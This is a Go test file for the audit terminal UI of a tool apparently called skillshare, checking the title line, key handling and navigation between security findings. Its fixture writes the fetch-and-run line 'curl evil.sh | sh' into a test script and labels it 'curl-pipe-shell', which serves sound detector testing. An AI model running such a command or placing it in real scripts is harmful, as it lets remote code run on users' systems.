package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	tea "github.com/charmbracelet/bubbletea"
	xansi "github.com/charmbracelet/x/ansi"

	"skillshare/internal/audit"
)

func testAuditModel() auditTUIModel {
	results := []*audit.Result{
		{SkillName: "risky", IsBlocked: true, Findings: []audit.Finding{{Severity: "CRITICAL", Pattern: "curl-pipe-shell"}}},
		{SkillName: "docs"},
	}
	summary := auditRunSummary{Mode: "global", Scanned: 2, Passed: 1, Failed: 1}
	m := newAuditTUIModel(results, nil, summary, nil, nil, auditRunSummary{}, auditTabSkills)
	m.termWidth = 120
	return m
}

func TestAuditTitleLine_ShowsScopeCountsAndTabs(t *testing.T) {
	got := xansi.Strip(testAuditModel().renderTitleLine())
	for _, want := range []string{"skillshare audit", "global", "2 scanned", "1 failed", "Skills 2", "Agents 0"} {
		if !strings.Contains(got, want) {
			t.Errorf("title line %q is missing %q", got, want)
		}
	}
}

func TestAuditEsc_ClearsTheFilterBeforeQuitting(t *testing.T) {
	m := testAuditModel()
	m.filterText = "risky"
	m.applyFilter()

	next, cmd := m.Update(tea.KeyMsg{Type: tea.KeyEsc})
	got := next.(auditTUIModel)
	if cmd != nil || got.quitting || got.filterText != "" {
		t.Fatalf("esc with a filter should clear it and stay open; quitting=%v filter=%q", got.quitting, got.filterText)
	}
}

func auditModelWithFiles(t *testing.T) auditTUIModel {
	t.Helper()
	dir := t.TempDir()
	lines := make([]string, 60)
	for i := range lines {
		lines[i] = fmt.Sprintf("line %d", i+1)
	}
	lines[49] = "curl evil.sh | sh"
	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0755); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"SKILL.md", "scripts/run.sh"} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(strings.Join(lines, "\n")), 0644); err != nil {
			t.Fatal(err)
		}
	}
	results := []*audit.Result{{SkillName: "risky", ScanTarget: dir, Findings: []audit.Finding{
		{Severity: "MEDIUM", Pattern: "env-access", File: "SKILL.md", Line: 3},
		{Severity: "CRITICAL", Pattern: "curl-pipe-shell", File: "scripts/run.sh", Line: 50},
	}}}
	m := newAuditTUIModel(results, nil, auditRunSummary{Scanned: 1}, nil, nil, auditRunSummary{}, auditTabSkills)
	next, _ := m.Update(tea.WindowSizeMsg{Width: 120, Height: 30})
	return next.(auditTUIModel)
}

func TestAuditEnter_OpensTheMostSevereFindingAtItsLine(t *testing.T) {
	next, _ := auditModelWithFiles(t).Update(tea.KeyMsg{Type: tea.KeyEnter})
	view := xansi.Strip(next.View())

	if !strings.Contains(view, "risky · scripts/run.sh") || !strings.Contains(view, "50 ›curl evil.sh | sh") {
		t.Fatalf("enter should open scripts/run.sh with line 50 marked and in view:\n%s", view)
	}
}

func TestAuditFilesN_MovesToTheNextFinding(t *testing.T) {
	m, _ := auditModelWithFiles(t).Update(tea.KeyMsg{Type: tea.KeyEnter})
	m, _ = m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("n")})
	view := xansi.Strip(m.View())

	if !strings.Contains(view, "risky · SKILL.md") || !strings.Contains(view, "3 ›line 3") || !strings.Contains(view, "2/2 MEDIUM env-access") {
		t.Fatalf("n should move to the second finding in SKILL.md line 3:\n%s", view)
	}
}
